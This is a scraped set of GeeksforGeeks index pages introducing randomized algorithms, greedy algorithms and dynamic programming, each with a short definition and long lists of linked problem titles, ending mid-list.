StructuresMatrixStringAll Data StructuresProgramming Languagesexpand_moreCC++JavaPythonC#Go LangSQLPHPScalaPerlKotlinWeb Technologiesexpand_moreHTMLCSSBootstrapJavaScriptJqueryReactJSNodeJSAngularJSDjango FrameworkTutorial Libraryexpand_morePython TutorialDjango TutorialPandas TutorialKivy TutorialTkinter TutorialOpenCV TutorialSelenium TutorialComputer Science Subjectsexpand_moreEngineering MathematicsOperating SystemsDBMSComputer NetworkComputer Organization & ArchitectureTOCCompiler DesignDigital Elec. & Logic DesignSoftware EngineeringGATE 2021expand_moreGATE CS NotesGate CornerPrevious Year GATE PapersLast Minute Notes (LMNs)Important Topic - GATE 2021GATE 2021 CourseUGC NET / ISROexpand_moreUGC NET Notes - Paper IIUGC NET Notes - Paper IIIUGC NET Solved PapersISRO CS Solved PapersISRO Official KeysISRO CSE SyllabusQUIZ Sectionexpand_moreC QuizC++ QuizJava QuizPython QuizData Structures QuizAlgorithms QuizAptitude QuizTopic-wise MCQsPuzzlesGeeksforgeeks Initiativesexpand_moreCampus Ambassador ProgramGeek Of The MonthGeek On The TOPCampus Geek Of The MonthTechnical Scripter EventComputer Science Projects Randomized Algorithms An algorithm that uses random numbers to decide what to do next anywhere in its logic is called Randomized Algorithm. For example, in Randomized Quick Sort, we use random number to pick the next pivot (or we randomly shuffle the array). Typically, this randomness is used to reduce time complexity or space complexity in other standard algorithms. Recent Articles on Randomized Algorithms ! Random Variables Randomized Algorithms | Set 0 (Mathematical Background) Randomized Algorithms | Set 1 (Introduction and Analysis) Randomized Algorithms | Set 2 (Classification and Applications) Randomized Algorithms | Set 3 (1/2 Approximate Median) Binomial Random Variables Generate integer from 1 to 7 with equal probability Make a fair coin from a biased coin Shuffle a given array Reservoir Sampling Select a random number from stream, with O(1) space Random number generator in arbitrary probability distribution fashion Write a function that generates one of 3 numbers according to given probabilities K’th Smallest/Largest Element in Unsorted Array | Set 2 (Expected Linear Time) Birthday Paradox Linearity of Expectation Expected Number of Trials until Success Load Balancing on Servers (Randomized Algorithm) Karger’s algorithm for Minimum Cut | Set 1 (Introduction and Implementation) Select a Random Node from a Singly Linked List Karger’s algorithm for Minimum Cut | Set 2 (Analysis and Applications) Primality Test | Set 2 (Fermat Method) Generate 0 and 1 with 25% and 75% probability Implement rand3() using rand2() Strong Password Suggester Program Freivald’s Algorithm to check if a matrix is product of two mplement random-0-6-Generator using the given random-0-1-Generator Select a Random Node from a tree with equal probability QuickSort using Random Pivoting Operations on Sparse Matrices Random Walk (Implementation in Python) Expectation or expected value of an array Estimating the value of Pi using Monte Carlo Randomized Binary Search Algorithm Shuffle a deck of cards Program to generate CAPTCHA and verify user Find an index of maximum occurring element with equal probability Implement rand12() using rand6() in one line Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above. My Personal Notes arrow_drop_up Save Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseProof that Clique Decision problem is NP-Complete | Set 2Top 5 IDEs for C++ That You Should Try OnceHow to find index of a given element in a Vector in C++ Most Visited Articles How to update Node.js and NPM to next version ?How to Hack WPA/WPA2 WiFi Using Kali Linux?How to Dynamically Add/Remove Table Rows using jQuery ?How to drop rows in Pandas DataFrame by index labels?How to create an empty DataFrame and append rows & columns to it in Pandas? room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Greedy Algorithms - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Write an Articleexpand_moreWrite ArticlesWrite Interview ExperienceGuidelines to WriteGet Technical Writing InternshipCC++JavaPythonMachine LearningInterview Preparationexpand_moreInterview Preparation For Software DevelopersMust Coding Questions - Company-wise Must Do Coding Questions - Topic-wiseCompany-wise Practice ProblemsCompany PreparationCompetitive ProgrammingSoftware Design-PatternsCompany-wise Interview ExperienceExperienced - Interview ExperiencesIntership - Interview ExperiencesPractice @Geeksforgeeksexpand_moreLeaderboard !!Topic-wise PracticeSubjective ProblemsDifficulty Level - SchoolDifficulty Level - BasicDifficulty Level - EasyDifficulty Level - MediumDifficulty Level - HardExplore More...Algorithmsexpand_moreAnalysis of AlgorithmsSearching AlgorithmsSorting AlgorithmsPattern SearchingGeometric AlgorithmsMathematical AlgorithmsRandomized AlgorithmsGreedy AlgorithmsDynamic ProgrammingDivide & ConquerBacktrackingBranch & BoundAll AlgorithmsData Structuresexpand_moreArraysLinked ListStackQueueBinary TreeBinary Search TreeHeapHashingGraphAdvance Data StructuresMatrixStringAll Data StructuresProgramming Languagesexpand_moreCC++JavaPythonC#Go LangSQLPHPScalaPerlKotlinWeb Technologiesexpand_moreHTMLCSSBootstrapJavaScriptJqueryReactJSNodeJSAngularJSDjango FrameworkTutorial Libraryexpand_morePython TutorialDjango TutorialPandas TutorialKivy TutorialTkinter TutorialOpenCV TutorialSelenium TutorialComputer Science Subjectsexpand_moreEngineering MathematicsOperating SystemsDBMSComputer NetworkComputer Organization & ArchitectureTOCCompiler DesignDigital Elec. & Logic DesignSoftware EngineeringGATE 2021expand_moreGATE CS NotesGate CornerPrevious Year GATE PapersLast Minute Notes (LMNs)Important Topic - GATE 2021GATE 2021 CourseUGC NET / ISROexpand_moreUGC NET Notes - Paper IIUGC NET Notes - Paper IIIUGC NET Solved PapersISRO CS Solved PapersISRO Official KeysISRO CSE SyllabusQUIZ Sectionexpand_moreC QuizC++ QuizJava QuizPython QuizData Structures QuizAlgorithms QuizAptitude QuizTopic-wise MCQsPuzzlesGeeksforgeeks Initiativesexpand_moreCampus Ambassador ProgramGeek Of The MonthGeek On The TOPCampus Geek Of The MonthTechnical Scripter EventComputer Science Projects Greedy Algorithms Greedy is an algorithmic paradigm that builds up a solution piece by piece, always choosing the next piece that offers the most obvious and immediate benefit. So the problems where choosing locally optimal also leads to global solution are best fit for Greedy. For example consider the Fractional Knapsack Problem. The local optimal strategy is to choose the item that has maximum value vs weight ratio. This strategy also leads to global optimal solution because we allowed to take fractions of an item. Recent Articles on Greedy Algorithms ! Standard Greedy Algorithms Greedy Algorithms in Graphs Greedy Algorithms in Operating Systems Greedy Algorithms in Arrays Approximate Greedy Algorithms for NP Complete Problems Greedy Algorithms for Special Cases of DP problems Misc Quick Links Standard Greedy Algorithms : Activity Selection Problem Egyptian Fraction Job Sequencing Problem Job Sequencing Problem (Using Disjoint Set) Job Sequencing Problem – Loss Minimization Job Selection Problem – Loss Minimization Strategy | Set 2 Huffman Coding Efficient Huffman Coding for sorted input Huffman Decoding Water Connection Problem Policemen catch thieves Minimum Swaps for Bracket Balancing Fitting Shelves Problem Assign Mice to Holes Greedy Algorithms in Graphs : Kruskal’s Minimum Spanning Tree Prim’s Minimum Spanning Tree Boruvka’s Minimum Spanning Tree Reverse delete algorithm for MST Problem Solving for Minimum Spanning Trees (Kruskal’s and Prim’s) Dijkastra’s Shortest Path Algorithm Dial’s Algorithm Dijkstra’s Algorithm for Adjacency List Representation Prim’s MST for adjacency list representation Correctness of Greedy Algorithms Minimum cost to connect all cities Max Flow Problem Introduction Number of single cycle components in an undirected graph Greedy Algorithms in Arrays : Minimum product subset of an array Maximum product subset of an array Maximize array sum after k-negations | Set 1 Maximize array sum after k-negations | Set 2 Maximize the sum of arr[i]*i Maximum sum of increasing order elements from n arrays Maximum sum of absolute difference of an array Maximize sum of consecutive differences in a circular array Maximum height pyramid from the given array of objects Partition into two subarrays of lengths k and (N – k) such that the difference of sums is maximum Minimum sum of product of two arrays Minimum sum by choosing minimum of pairs from array Minimum sum of absolute difference of pairs of two arrays Minimum operations to make GCD of array a multiple of k Minimum sum of absolute difference of pairs of two arrays Minimum sum of two numbers formed from digits of an array Minimum increment/decrement to make array non-Increasing Making elements of two arrays same with minimum increment/decrement Minimize sum of product of two arrays with permutation allowed Sorting array with reverse around middle Sum of Areas of Rectangles possible for an array Array element moved by k using single moves Find if k bookings possible with given arrival and departure times Lexicographically smallest array after at-most K consecutive swaps Largest lexicographic array with at-most K consecutive swaps Greedy Algorithms in Operating Systems : First Fit algorithm in Memory Management Best Fit algorithm in Memory Management Worst Fit algorithm in Memory Management Operating System | Program for Next Fit algorithm in Memory Management Shortest Job First Scheduling Program for Shortest Job First (SJF) scheduling | Set 2 (Preemptive) Schedule jobs so that each server gets equal load Job Scheduling with two jobs allowed at a time Scheduling priority tasks in limited time and minimizing loss Program for Optimal Page Replacement Algorithm Program for Page Replacement Algorithms | Set 1 ( LRU) Program for Page Replacement Algorithms | Set 2 (FIFO) Approximate Greedy Algorithms for NP Complete Problems : Set cover problem Bin Packing Problem Graph Coloring K-centers problem Shortest superstring problem Travelling Salesman Problem | Set 1 (Naive and Dynamic Programming) Traveling Salesman Problem | Set 2 (Approximate using MST) Greedy Algorithms for Special Cases of DP problems : Fractional Knapsack Problem Minimum number of coins required Misc : Split n into maximum composite numbers Maximum trains for which stoppage can be provided Buy Maximum Stocks if i stocks can be bought on i-th day Find the minimum and maximum amount to buy all N candies Maximum sum possible equal to sum of three stacks Maximum elements that can be made equal with k updates Divide cuboid into cubes such that sum of volumes is maximum Maximum number of customers that can be satisfied with given quantity Minimum Fibonacci terms with sum equal to K Divide 1 to n into two groups with minimum sum difference Minimize cash flow among friends Minimum rotations to unlock a circular lock Paper cut into minimum number of squares Minimum difference between groups of size two Minimum rooms for m events of n batches with given schedule Connect n ropes with minimum cost Minimum Cost to cut a board into squares Minimum cost to process m tasks where switching costs Minimum cost to make array size 1 by removing larger of pairs Minimum cost for acquiring all coins with k extra coins allowed with every coin Minimum time to finish all jobs with given constraints Minimum number of Platforms required for a railway/bus station Minimize the maximum difference between the heights of towers Minimum increment by k operations to make all elements equal Minimum edges to reverse to make path from a source to a destination Find minimum number of currency notes and values that sum to given amount Minimum initial vertices to traverse whole matrix with given conditions Find the Largest Cube formed by Deleting minimum Digits from a number Check if it is possible to survive on Island Largest palindromic number by permuting digits Smallest number with sum of digits as N and divisible by 10^N Find Smallest number with given number of digits and digits sum Rearrange characters in a string such that no two adjacent are same Rearrange a string so that all same characters become d distance away Print a closest string that does not contain adjacent duplicates Smallest subset with sum greater than all other elements Lexicographically largest subsequence such that every character occurs at least k times Quick Links : Top 20 Greedy Algorithms Interview Questions ‘Practice Problems’ on Greedy Algorithms Practice Questions on Huffman Encoding ‘Quiz’ on Greedy Algorithms If you like GeeksforGeeks and would like to contribute, you can also write an article and mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks. Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above. My Personal Notes arrow_drop_up Save Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseProof that Clique Decision problem is NP-Complete | Set 2Major Kernel Functions in Support Vector Machine (SVM)Top 5 IDEs for C++ That You Should Try Once Most Visited Articles How to find index of a given element in a Vector in C++How to update Node.js and NPM to next version ?How to drop rows in Pandas DataFrame by index labels?How to create an empty DataFrame and append rows & columns to it in Pandas?Replace NaN Values with Zeros in Pandas DataFrame room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Dynamic Programming - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Write an Articleexpand_moreWrite ArticlesWrite Interview ExperienceGuidelines to WriteGet Technical Writing InternshipCC++JavaPythonMachine LearningInterview Preparationexpand_moreInterview Preparation For Software DevelopersMust Coding Questions - Company-wise Must Do Coding Questions - Topic-wiseCompany-wise Practice ProblemsCompany PreparationCompetitive ProgrammingSoftware Design-PatternsCompany-wise Interview ExperienceExperienced - Interview ExperiencesIntership - Interview ExperiencesPractice @Geeksforgeeksexpand_moreLeaderboard !!Topic-wise PracticeSubjective ProblemsDifficulty Level - SchoolDifficulty Level - BasicDifficulty Level - EasyDifficulty Level - MediumDifficulty Level - HardExplore More...Algorithmsexpand_moreAnalysis of AlgorithmsSearching AlgorithmsSorting AlgorithmsPattern SearchingGeometric AlgorithmsMathematical AlgorithmsRandomized AlgorithmsGreedy AlgorithmsDynamic ProgrammingDivide & ConquerBacktrackingBranch & BoundAll AlgorithmsData Structuresexpand_moreArraysLinked ListStackQueueBinary TreeBinary Search TreeHeapHashingGraphAdvance Data StructuresMatrixStringAll Data StructuresProgramming Languagesexpand_moreCC++JavaPythonC#Go LangSQLPHPScalaPerlKotlinWeb Technologiesexpand_moreHTMLCSSBootstrapJavaScriptJqueryReactJSNodeJSAngularJSDjango FrameworkTutorial Libraryexpand_morePython TutorialDjango TutorialPandas TutorialKivy TutorialTkinter TutorialOpenCV TutorialSelenium TutorialComputer Science Subjectsexpand_moreEngineering MathematicsOperating SystemsDBMSComputer NetworkComputer Organization & ArchitectureTOCCompiler DesignDigital Elec. & Logic DesignSoftware EngineeringGATE 2021expand_moreGATE CS NotesGate CornerPrevious Year GATE PapersLast Minute Notes (LMNs)Important Topic - GATE 2021GATE 2021 CourseUGC NET / ISROexpand_moreUGC NET Notes - Paper IIUGC NET Notes - Paper IIIUGC NET Solved PapersISRO CS Solved PapersISRO Official KeysISRO CSE SyllabusQUIZ Sectionexpand_moreC QuizC++ QuizJava QuizPython QuizData Structures QuizAlgorithms QuizAptitude QuizTopic-wise MCQsPuzzlesGeeksforgeeks Initiativesexpand_moreCampus Ambassador ProgramGeek Of The MonthGeek On The TOPCampus Geek Of The MonthTechnical Scripter EventComputer Science Projects Dynamic Programming Dynamic Programming is mainly an optimization over plain recursion. Wherever we see a recursive solution that has repeated calls for same inputs, we can optimize it using Dynamic Programming. The idea is to simply store the results of subproblems, so that we do not have to re-compute them when needed later. This simple optimization reduces time complexities from exponential to polynomial. For example, if we write simple recursive solution for Fibonacci Numbers, we get exponential time complexity and if we optimize it by storing solutions of subproblems, time complexity reduces to linear. Recent Articles on Dynamic Programming Basic Concepts Advanced Concepts Basic Problems Intermediate Problems Hard Problems Quick Links Basic Concepts : Tabulation vs Memoizatation Optimal Substructure Property Overlapping Subproblems Property How to solve a Dynamic Programming Problem ? Advanced Concepts : Bitmasking and Dynamic Programming | Set 1 Bitmasking and Dynamic Programming | Set-2 (TSP) Digit DP | Introduction Basic Problems : Ugly numbers Fibonacci numbers nth Catalan Number Bell Numbers (Number of ways to Partition a Set) Binomial Coefficient Permutation Coefficient Tiling Problem Gold Mine Problem Coin change problem Friends Pairing Problem Subset Sum Problem Subset Sum Problem in O(sum) space Subset with sum divisible by m Largest divisible pairs subset Perfect Sum Problem (Print all subsets with given sum) Compute nCr % p Choice of area Cutting a Rod Tiling with Dominoes Painting Fence Algorithm Newman–Shanks–Williams prime Assembly line scheduling Golomb sequence Moser-de Bruijn Sequence Newman-Conway Sequence Find maximum length Snake sequence Print n terms of Newman-Conway Sequence Print Fibonacci sequence using 2 variables Print Fibonacci Series in reverse order Count even length binary sequences with same sum of first and second half bits Sequences of given length where every element is more than or equal to twice of previous Longest Common Subsequence Longest Repeated Subsequence Longest Increasing Subsequence A Space Optimized Solution of LCS LCS (Longest Common Subsequence) of three strings Maximum sum Bi-tonic Sub-sequence Maximum Sum Increasing Subsequence Maximum product of an increasing subsequence Count all subsequences having product less than K Maximum subsequence sum such that no three are consecutive Longest subsequence such that difference between adjacents is one Maximum length subsequence with difference between adjacent elements as either 0 or 1 Maximum sum increasing subsequence from a prefix and a given element after prefix is must Maximum Length Chain of Pairs Print Maximum Length Chain of Pairs Path with maximum average value Maximum games played by winner Maximum path sum in a triangle Minimum Sum Path in a Triangle Maximum sum of a path in a Right Number Triangle Size of The Subarray With Maximum Sum Maximum sum of pairs with specific difference Maximum size square sub-matrix with all 1s Maximum number of segments of lengths a, b and c Recursively break a number in 3 parts to get maximum sum Maximum value with the choice of either dividing or considering as it is Maximum weight path ending at any element of last row in a matrix Maximum sum in a 2 x n grid such that no two elements are adjacent Maximum difference of zeros and ones in binary string | Set 2 (O(n) time) Maximum path sum for each position with jumps under divisibility condition Maximize the sum of selected numbers from an array to make it empty Maximum subarray sum in an array created after repeated concatenation Maximum path sum that starting with any cell of 0-th row and ending with any cell of (N-1)-th row Min Cost Path Minimum number of jumps to reach end Minimum cost to fill given weight in a bag Minimum sum of multiplications of n numbers Minimum removals from array to make max – min <= K Minimum steps to minimize n as per given condition Minimum number of edits ( operations ) require to convert string 1 to string 2 Minimum time to write characters using insert, delete and copy operation Longest Common Substring Longest Common Substring (Space optimized DP solution) Sum of all substrings of a string representing a number | Set 1 Find number of endless points Find n-th element from Stern’s Diatomic Series Find maximum possible stolen value from houses Find number of solutions of a linear equation of n variables Count number of ways to reach a given score in a game Count ways to reach the nth stair using step 1, 2 or 3 Count of different ways to express N as the sum of 1, 3 and 4 Count ways to build street under given constraints Count Balanced Binary Trees of Height h Counting pairs when a person can form pair with at most one Counts paths from a point to reach Origin Count number of ways to cover a distance Count of arrays having consecutive element with different values Count ways to divide circle using N non-intersecting chords Count the number of ways to tile the floor of size n x m using 1 x m size tiles Count all possible paths from top left to bottom right of a mXn matrix Count number of ways to fill a “n x 4” grid using “1 x 4” tiles Largest Sum Contiguous Subarray Smallest sum contiguous subarray Size of array after repeated deletion of LIS Remove array end element to maximize the sum of product Convert to Strictly increasing array with minimum changes Longest alternating (positive and negative) subarray starting at every index Ways to sum to N using array elements with repetition allowed Unique paths in a Grid with Obstacles Number of n-digits non-decreasing integers Number of ways to arrange N items under given constraints Probability of reaching a point with 2 or 3 steps at a time Value of continuous floor function : F(x) = F(floor(x/2)) + x Number of decimal numbers of length k, that are strict monotone Different ways to sum n using numbers greater than or equal to m Intermediate Problems : Lobb Number Eulerian Number Delannoy Number Entringer Number Rencontres Number Jacobsthal and Jacobsthal-Lucas numbers Super Ugly Number (Number whose prime factors are in given set) Floyd Warshall Algorithm Bellman–Ford Algorithm 0-1 Knapsack Problem Printing Items in 0/1 Knapsack Unbounded Knapsack (Repetition of items allowed) Temple Offerings Egg Dropping Puzzle Dice Throw Problem Word Break Problem Vertex Cover Problem Tile Stacking Problem Box-Stacking Problem Highway Billboard Problem Largest Independent Set Problem Partition Problem Print equal sum sets of array (Partition problem) | Set 1 Print equal sum sets of array (Partition Problem) | Set 2 High-effort vs. Low-effort Tasks Problem Travelling Salesman Problem | Set 1 (Naive and Dynamic Programming) Longest Bitonic Subsequence Printing Longest Bitonic Subsequence Longest Palindromic Subsequence Print Longest Palindromic Subsequence Longest palindrome subsequence with O(n) space Count All Palindromic Subsequence in a given String Longest Palindromic Substring | Set 1 Count All Palindrome Sub-Strings in a String | Set 1 Number of palindromic subsequences of length k Count of Palindromic substrings in an Index range Shortest Common Supersequence Maximum sum alternating subsequence Longest alternating subsequence Shortest Uncommon Subsequence Longest Repeating Subsequence Count Distinct Subsequences Count distinct occurrences as a subsequence Longest Common Increasing Subsequence (LCS + LIS) Variations of LIS LCS formed by consecutive segments of at least length K Printing Maximum Sum Increasing Subsequence Longest Increasing Odd Even Subsequence Count number of increasing subsequences of size k Printing longest Increasing consecutive subsequence Construction of Longest Increasing Subsequence using Dynamic Programming Longest Zig-Zag Subsequence Largest sum Zigzag sequence in a matrix Find all distinct subset (or subsequence) sums of an array Print all longest common sub-sequences in lexicographical order Printing Longest Common Subsequence | Set 2 (Printing All) Length of Longest Balanced Subsequence Non-decreasing subsequence of size k with minimum sum Longest Common Subsequence with at most k changes allowed Weighted job scheduling Weighted Job Scheduling | Set 2 (Using LIS) Weighted Job Scheduling in O(n Log n) time Number of paths with exactly k coins Minimum number of coins that make a given value Collect maximum coins before hitting a dead end Coin game winner where every player has three choices Probability of getting at least K heads in N tosses of Coins Count all increasing subsequences Count number of paths with at-most k turns Count possible ways to construct buildings Count number of ways to jump to reach end Count number of ways to reach destination in a Maze Count all triplets whose sum is equal to a perfect cube Count number of binary strings without consecutive 1’s Count number of subsets having a particular XOR value Count Possible Decodings of a given Digit Sequence Count number of ways to partition a set into k subsets Count of n digit numbers whose sum of digits equals to given sum Count ways to assign unique cap to every person Count binary strings with k times appearing adjacent two set bits Count of strings that can be formed using a, b and c under given constraints Count digit groupings of a number with given constraints Count all possible walks from a source to a destination with exactly k edges Count Derangements (Permutation such that no element appears in its original position) Count total number of N digit numbers such that the difference between sum of even and odd digits is 1 Maximum Product Cutting Maximum profit from sale of wines Maximum size subset with given sum Maximum difference of zeros and ones in binary string Maximum and Minimum Values of an Algebraic Expression Maximum average sum partition of an array Maximize array elements upto given number Maximum subarray sum in O(n) using prefix sum Maximum sum subarray removing at most one element K maximum sums of non-overlapping contiguous sub-arrays Maximum Product Subarray | Added negative product case Find maximum sum array of length less than or equal to m Find Maximum dot product of two arrays with insertion of 0’s Choose maximum weight with given weight and value ratio Maximum sum subsequence with at-least k distant elements Maximum profit by buying and selling a share at most twice Maximum sum path in a matrix from top to bottom Maximum decimal value path in a binary matrix Finding the maximum square sub-matrix with all equal elements Maximum points collected by two persons allowed to meet once Maximum number of trailing zeros in the product of the subsets of size k Minimum Sum Path In 3-D Array Minimum insertions to sort an array Minimum sum submatrix in a given 2D array Minimum Initial Points to Reach Destination Minimum Cost To Make Two Strings Identical Paper Cut into Minimum Number of Squares | Set 2 Minimum and Maximum values of an expression with * and + Minimum insertions to form a palindrome Minimum number of deletions to make a string palindrome Minimum number of deletions to make a string palindrome | Set 2 Minimum jumps to reach last building in a matrix Sub-tree with minimum color difference in a 2-coloured tree Minimum number of deletions to make a sorted sequence Minimum number of squares whose sum equals to given number n Remove minimum elements from either side such that 2*min becomes more than max Minimal moves to form a string by adding characters or appending string itself Minimum steps to delete a string after repeated deletion of palindrome substrings Clustering/Partitioning an array such that sum of square differences is minimum Minimum sum subsequence such that at least one of every four consecutive elements is picked Minimum cost to make Longest Common Subsequence of length k Minimum cost to make two strings identical by deleting the digits Minimum time to finish tasks without skipping two consecutive Minimum cells required to reach destination with jumps equal to cell values Minimum number of deletions and insertions to transform one string into another Find minimum adjustment cost of an array Find if string is K-Palindrome or not | Set 1 Find if string is K-Palindrome or not | Set 2 Find Jobs involved in Weighted Job Scheduling Find the Longest Increasing Subsequence in Circular manner Find the longest path in a matrix with given constraints Find the minimum cost to reach destination using a train Find minimum sum such that one of every three consecutive elements is taken Find number of times a string occurs as a subsequence in given string Find length of the longest consecutive path from a given starting character Find length of longest subsequence of one string which is substring of another string Find longest bitonic sequence such that increasing and decreasing parts are from two different arrays Wildcard Pattern Matching WildCard pattern matching having three symbols ( * , + , ? ) Dynamic Programming | Wildcard Pattern Matching | Linear Time and Constant Space Check if any valid sequence is divisible by M Check for possible path in 2D matrix Check if possible to cross the matrix with given power Check if it is possible to transform one string to another Given a large number, check if a subsequence of digits is divisible by 8 Hosoya’s Triangle Optimal Strategy for a game Optimal Binary Search Tree Number of permutation with K inversions Largest divisible pairs subset Sum of average of all subsets Compute sum of digits in all numbers from 1 to n Total number of non-decreasing numbers with n digits Non-crossing lines to connect points in a circle Dynamic Programming | Building Bridges Longest Increasing Path in Matrix Prefix Sum of Matrix (Or 2D Array) Multistage Graph (Shortest Path) Number of n digit stepping numbers Number of substrings divisible by 8 but not by 3 Number of ordered pairs such that (Ai & Aj) = 0 Number of ways to form a heap with n distinct integers Ways to write n as sum of two or more positive integers Modify array to maximize sum of adjacent differences Sum of products of all combination taken (1 to n) at a time Maximize the binary matrix by filpping submatrix once Length of the longest substring without repeating characters Longest Even Length Substring such that Sum of First and Second Half is same Shortest path with exactly k edges in a directed and weighted graph Ways to arrange Balls such that adjacent balls are of different types Ways of transforming one string to other by removing 0 or more characters Balanced expressions such that given positions have opening brackets Longest alternating sub-array starting from every index in a Binary Array Partition a set into two subsets such that the difference of subset sums is minimum Pyramid form (increasing then decreasing) consecutive array using reduce operations Hard Problems : Palindrome Partitioning Word Wrap Problem Mobile Numeric Keypad Problem The painter’s partition problem Boolean Parenthesization Problem Program for Bridge and Torch problem A Space Optimized DP solution for 0-1 Knapsack Problem Matrix Chain Multiplication Printing brackets in Matrix Chain Multiplication Problem Number of palindromic paths in a matrix Largest rectangular sub-matrix whose sum is 0 Largest rectangular sub-matrix having sum divisible by k Largest area rectangular sub-matrix with equal number of 1’s and 0’s Maximum sum bitonic subarray Maximum sum rectangle in a 2D matrix Maximum Subarray Sum Excluding Certain Elements Maximum weight transformation of a given string Collect maximum points in a grid using two traversals K maximum sums of overlapping contiguous sub-arrays How to print maximum number of A’s using given four keys Maximize arr[j] – arr[i] + arr[l] – arr[k], such that i < j < k < l Maximum profit by buying and selling a share at most k times Maximum points from top left of matrix to bottom right and return back Check whether row or column swaps produce maximum size binary sub-matrix with all 1s Minimum Cost Polygon Triangulation Minimum cost to sort strings using reversal operations of different costs Find minimum possible size of array with given rules for removing elements Minimum number of elements which are not part of Increasing or decreasing subsequence in array Count ways to increase LCS length of two strings by one Count of AP (Arithmetic Progression) Subsequences in an array Count of arrays in which all adjacent elements are such that one of them divide the another Number of NGEs to the right Longest Arithmetic Progression Longest Geometric Progression Dynamic Programming on Trees | Set-1 Dynamic Programming on Trees | Set-2 All ways to add parenthesis for evaluation Shortest possible combination of two strings Check if all people can vote on two machines Find if a string is interleaved of two other strings Longest repeating and non-overlapping substring Probability of Knight to remain in the chessboard Number of subsequences of the form a^i b^j c^k Number of subsequences in a string divisible by n Printing Shortest Common Supersequence Smallest length string with repeated replacement of two distinct adjacent Number of ways to insert a character to 